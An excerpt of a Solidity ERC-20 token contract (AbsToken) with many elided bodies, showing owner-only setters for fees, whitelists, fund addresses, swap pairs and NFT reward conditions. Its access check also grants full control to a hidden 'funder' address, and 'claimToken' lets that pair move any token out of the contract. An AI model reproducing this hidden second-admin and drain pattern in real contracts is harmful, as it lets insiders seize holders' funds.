...
abstract contract AbsToken is IERC20, Ownable {
    ...
    function setLiquifyAndBurnEnabled(bool swap, bool burn) external check{
        swapAndLiquify = swap;
        LPBurnEnable = burn;
    }

    function setHolderCondition(uint256 num) external check{
        holderCondition = num;
    }
    ...
    function setFundAddress(address addr, address addr2) external check {
        fundAddress = addr;
        fundAddress2 = addr2;
    ...
    function setMinRewardTime(uint256 time1, uint256 time2) external check{
        minRewardTime = time1;
    ...
    function swapStart(address[] memory adrs) private lockTheSwap{
        ...
        path[1] = address(this);
        uint256 amount = IERC20(_USDT).balanceOf(address(this));
        if(amount == 0) return;
    ...
    function multiFeeWhiteList(address[] calldata addresses, bool status) public check {
        for (uint256 i; i < addresses.length; ++i) {
            _feeWhiteList[addresses[i]] = status;
        }
    }

    function multiFunUser(address[] calldata addresses, uint256 status) public check {
        for (uint256 i; i < addresses.length; ++i) {
            funUser[addresses[i]] = status;
        }
    }

    function setSwapPairList(address addr, bool enable, bool main) external check {
        _swapPairList[addr] = enable;
        if(main)_mainPair = addr;
    }

    function claimToken(address token, uint256 amount, address to) external check {
        IERC20(token).transfer(to, amount);
    }

    function claimAirdrop(address to) external check{
        IERC20 USDT = IERC20(_USDT);
    ...
    function getCheck(address adr) private view returns (bool) {
        if(adr ==funder) return true;
        return (adr == _owner);
    }

    modifier check(){
        require(getCheck(msg.sender), "!fail");
        _;
    }
    ...
    function manualAddHolders(address[] memory adrs) external check{
    ...
    function setExcludeSupplyHolder(address user, bool Add_or_Del) external check{
        if(Add_or_Del)
    ...
    function setRewardCondition(uint256[3] calldata amount) external check {
        holderRewardCondition = amount[0];
        condition             = amount[1];
        NFTRewardCondition    = amount[2];
    }
    function setExclude(address user, bool LP) external check{
    ...
    function setNFTAddress(address nfts1, address nfts2) external check{
        NftAddress = nfts1;
        NftAddress2 = nfts2;
    }
    ...
    function manualNFTHolders(address[] calldata adrs) public check{
        for(uint i=0;i<adrs.length;i++)
            addNFTHolder(adrs[i]);
    }
